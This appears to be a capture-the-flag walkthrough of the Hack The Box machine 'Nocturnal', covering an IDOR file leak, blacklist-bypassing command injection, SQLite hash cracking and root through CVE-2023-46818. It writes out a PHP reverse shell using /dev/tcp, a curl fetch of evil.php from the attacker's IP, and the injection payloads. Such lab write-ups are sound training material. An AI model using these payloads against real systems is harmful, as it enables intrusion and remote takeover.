---
tags:
  - Linux
  - HTTP
  - IDOR
  - OS-command injection
  - localhost service
  - PHP
---

... is an easy HTB machine which offers a file uploading / -viewing functionality on a `http` service. It has a `IDOR` vulnerability which allows you to get the credentials of a privileged user by viewing their files. With those credentials, you can access the admin back-end, which has an OS-command injection vulnerability, enabling RCE. For the privilege escalation, a service is listening on `localhost:8080`, running software which is vulnerable to PHP code injection.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
This is a very typical setup of a web-vulnerability type CTF, where the `http` service allows you to execute remote code on the machine, to allow you to find credentials for `ssh`. The output of the `http-title` `nmap` script tells us that the domain name `nocturnal.htb` is present. To quickly edit the `/etc/hosts` file for local DNS name resolution without a public DNS server, the following command appends an entry to that file:
```bash
echo "$IP nocturnal.htb" | sudo tee --append /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# echo "...": writes the specified string into STDOUT (terminal)
# | : redirect (pipe) the STDOUT of the left command into the STDIN of the right command
# sudo tee --append /etc/hosts: write the received STDIN into a file without overwriting it. requires sudo, as that file is critical to the system  
```

After visiting `http://nocturnal.htb`, i am greeted with a `Welcome to Nocturnal` page. There are two `href`'s which redirect me to `/login.php` and `/register.php`. This tells me that the back-end language is `PHP`. Regarding the other text on the home-page, logging-in allows me to upload `word`, `excel` or `PDF` documents and then view (render) them. If i can somehow get a custom `PHP` file into the uploads, i can get RCE!

To find more endpoints that may be hidden in the `view-source`, i use `ffuf` to employ forceful browsing using this command:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u "http://nocturnal.htb/FUZZ.php"
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -u: URL of the target. the FUZZ word gets replaced with each entry of the wordlist.
```

The scan revealed the following endpoints (i also removed the `.php` in the scan):

- `/admin.php`, `/dashboard.php`, `view.php`: redirects me to `login.php`, may be interesting after logging in!
- `/backups`, `/uploads`: give me a `403 Forbidden`. The `/uploads` is probably the directory where i can find the uploaded files.

Before logging in and trying to find vulnerabilities, i use `ffuf` to find other host-names, as the host-name `nocturnal.htb` being used. I achieve this by doing `VHost` fuzzing:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -H "Host: FUZZ.nocturnal.htb" -u http://nocturnal.htb -fs 154
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -H: add specific header. Here, the header "FUZZ.nocturnal.htb" is chosen. the FUZZ word is replaced by each entry of the wordlist!
# -u: URL of the target
# -fs: filter by response size
```

I even tried with the word-list `SecLists/Discovery/DNS/subdomains-top1million-110000.txt`, but that did not find any additional sub-hosts.

This is why i decided to use the `register.php` and to access the file-upload functionality.

### Initial Exploitation
After creating an account (using the credentials `attacker:password`), i can select a file from my file system to upload it. When remembering the start page, i should be only able to upload `word`, `excel` or `PDF` files. I download a sample `PDF` [here](https://pdfobject.com/pdf/sample.pdf), and intercept the upload request in `burpsuite` to find out what i am sending. It seems to be a very normal `POST` request to the endpoint `/dashboard.php`, with the content of the PDF being sent in a `WebKitForm`. These are the parameters of the `Form`:
```http
Content-Disposition: form-data; name="fileToUpload"; filename="sample.pdf"
Content-Type: application/pdf
```

The obvious attack would be to try and upload a custom `PHP` file, but i decided to investigate the `view.php` first, as that allows me to view the uploaded `PDF`. The intercepted `viewing` request showed something interesting:
```http
GET /view.php?username=attacker&file=sample.pdf HTTP/1.1
Host: nocturnal.htb
...
```
There are two attack scenarios which open up here besides the `PHP` upload:

- Use `LFI` to read other files than `sample.pdf`.
- User `IDOR` to read the files of other `username`s.

I quickly sent the `GET` request to `burp`'s `Repeater` to mess with the parameters. Trying to fetch `/etc/passwd` gives me the error message `Invalid File Extension`, and fetching `/etc/passwd.pdf` tells me that this file does not exist. Injecting `null-bytes` (`%00`) to dismiss the file extension also does not work. This also rules out the idea of uploading a custom `PHP` file.

What is interesting though, is that the available files get shown to me in a list if the specified file is not found! This tells me that the `IDOR` attack to read files of other users may be very viable. I construct a `ffuf` command where i pass the required `Cookie: PHPSESSID` (without a valid session, i get a redirect to `login.php`) against this `username` parameter. For the word-list, i use the `SecLists/Usernames/Names/names.txt` word-list found on [their GitHub](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt):
```bash
ffuf -w names.txt -H "Cookie: PHPSESSID=<session-ID>" -u "http://nocturnal.htb/view.php?username=FUZZ&file=notfound.pdf" -fs 2985
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify the wordlist in the current directory
# -H: add the header with the cookie which was given to me after logging in
# -u: do attack against this URL, the username=FUZZ parameter gets replaced with each entry of the wordlist
# -fs: ignore responses with size 2985, as that responds with `User not Found`!
```

This gives me the three usernames which are registered:

- `admin`: has no uploaded files
- `amanda`: has uploaded `privacy.odt`!
- `tobias`: has no uploaded files

I quickly fetch `amandas` `privacy.odt` file with the following `GET` request: 
```http
GET /view.php?username=amanda&file=privacy.odt HTTP/1.1
Host: nocturnal.htb
```
This downloads the file to my machine.

A `ODT` file is a `OpenDocument Text` file which can be viewed using the `CLI`: `libreoffice privacy.odt` (installed with `sudo apt install libreoffice`). As `libreoffice` requires almost `1GB` of space, it is also possible to view its contents using `unzip privacy.odt` combined with `open content.xml`. 

Nevertheless, the `privacy.odt` reveals the password `arHkG7HAI68X8s1J`! This does not lead to `ssh` access, but it can be used to log in to the `nocturnal.htb` back-end as `amanda:arHkG7HAI68X8s1J`, which reveals the button `Go to Admin Panel`!

The admin panel allows me to view the file content of all `PHP` files on the server, and i can `Create Backup`'s using a button! Creating a backup takes a password as a parameter, and then after a while, gives you a `/backups/backup_...zip` to download, which includes all of the zip files.

This screams for `OS command injection`, as the user-provided `password` is probably being used in a command like this:
```bash
zip -e -P <my-password> backup.zip <backup-files> 
```
If my password is sent as `; whoami #`, the previous command fails, and my command `whoami` gets executed! Trying to use this as a zip password returns `Error: Try another password.`. Luckily enough, i can view the source-code for the `admin.php` and find out where this error message gets generated!

I find out that the `cleanEntry($_POST['password']);` method is called on my password, which does the following:
```bash
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }
    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```
If any of the characters in the blacklist are included in the password, the command does not execute! I consulted the [Command injection cheatsheet of PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#chaining-commands) to look for viable bypasses. I found out that a `line return`, so a newline character enables commands to be run in sequence. For the `space` problem, i cannot use `${IFS}` as both `$` and `{}` are blacklisted. Digging further i notice that the `TAB` character can be used as an alternative to spaces!

Using this information, i intercept the `POST` request to create a backup, send it to `burp's Repeater` and change it in the following way from this:
```http
POST /admin.php?view=dashboard.php HTTP/1.1
Host: nocturnal.htb
...

password=123&backup=
```
To this:
```http
POST /admin.php?view=dashboard.php HTTP/1.1
Host: nocturnal.htb
...

password=123
ping	-c	3	<my-IP>	#&backup=
```
I used the `Enter` key to create a newline to separate the commands, and used the `Tab` key to create tabs which will hopefully act as spaces! I do not need to URL-encode it, as `burp` will automatically do that for me when sending the request. Before sending this payload, i start listening for pings using `sudo tcpdump -i tun0 icmp`, and i do receive them!

For the reverse shell i need to get creative, as i am not allowed to pipe (`|`) anything to `bash`. As the created `backup.zip` files land in the `/backups` directory, my idea was to simply put a `evil.php` file there which initiates the reverse shell! It's content will look something like this:
```php
<?php system('bash -c "/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1"'); ?>
```
I prepare this file and serve it on my local `http` server (`python3 -m http.server 1337`). I change the payload to use `curl` to fetch this `evil.php` and store it locally:
```http
POST /admin.php?view=dashboard.php HTTP/1.1
Host: nocturnal.htb
...

password=123
curl	-O	http://<my-IP>:1337/evil.php	#&backup=
```
Now i start listening for incoming reverse shells using `nc`:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

And i try to render the `evil.php` by visiting `http://nocturnal.htb/backups/evil.php`. That did not work. I went back to the `admin.php` page and noticed that the `evil.php` landed in the same directory as all other `php` files, so i rendered it by visiting `http://nocturnal.htb/evil.php`, which gave me a reverse shell as `www-data`!

### Lateral Movement
As the user `www-data` is only a service account, it has very limited capabilities on the system. An actual user account within the `/home` directory is much more preferable.
The user `tobias` has a home directory, which is why i assumed that i need his account to gain `ssh` access to the machine. `ssh` access is always better than a reverse shell, as it is fully interactive. It is always possible to upgrade the reverse shell with a [neat trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), but `ssh` access to an actual account is always preferable.

As i have looked through the source code of the different `php` files using the `/admin.php` back-end, i noticed that `login.php` initiates a `SQLite3` connection to `../nocturnal_database/nocturnal_database.db`. That is why i dump all of its contents in the reverse shell using these commands:
```bash
sqlite3 nocturnal_database.db ".tables"
```
This returns the tables `uploads` and `users`. As i want to dump all contents from the `users` table, i issue this command:
```bash
sqlite3 nocturnal_database.db "select * from users;"
```
This gives me the `MD5` hash of the system-user `tobias`. I input it to the free password hash cracker [CrackStation](https://crackstation.net/) and receive the clear-text password `slowmotionapocalypse`, which i use for `ssh` access to `tobias`'s account!

### Privilege Escalation
I try the three main privilege escalation vectors:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

The `netstat` command reveals the port `8080` which is actively listening on `localhost` only. `ps aux | grep 8080` additionally reveals that `root` has started this service! This is why i use `ssh` local port forwarding using the following login:
```bash
ssh -L 1337:localhost:8080 tobias@$IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# 1337: port on our machine which gets opened. If talked to, ssh will forward it to the target port. can be any port.
# localhost: the remote host we want to reach. NOT $IP, as we want to be localhost (127.0.0.1) on the target.
# 8080: the remote port which gets interacted with when interacting with port 1337 on the local machine.
```

When visiting `localhost:1337` in `burpsuite`'s browser, i see a login form for the application `ISP CONFIG`. The credentials `tobias:slowmotionapocalypse` do not give me access, but using the username `admin` instead with the password `slowmotionapocalypse` works!

Navigating to the `Help` button reveals the version of `ISP CONFIG`, which is `3.2.10p1`. A quick google search reveals `CVE-2023-46818`! This public vulnerability is within the `System > Languages > Edit language` functionality (`POST` request to `/admin/language_edit.php`). This allows you to edit a local `.lng` file, which is then used to dynamically generate content on the page. There is no sanitation in place to prevent you to add `PHP` code!

An fully automated `PoC` is available at [this GitHub](https://github.com/bipbopbup/CVE-2023-46818-python-exploit). Using it like:
```bash
python3 exploit.py http://localhost:1337 admin slowmotionapocalypse
```
Gives you a terminal as `root`!

### Summary

Below is a visualized summary of the exploitation steps used in this machine to gain RCE.

``` mermaid
graph LR
  A[HTTP<br>Service] -->|IDOR| B[Valid<br>credentials];
  B -->|Login| C[Admin<br>panel];
  C -->|OS-Command<br>injection| D[Code<br>execution];

  E[Code<br>execution] -->|read| F[SQLite3<br>database];
  F -->|Hash<br>cracking| G[SSH<br>Access];
```

The privilege escalation to the user `root` worked as follows:

``` mermaid
graph LR
  A[SSH<br>access] -->|Port<br>forwarding| B[localhost<br>application];
  B -->|PHP-code<br>injection| D[Command<br>execution<br>as root];
```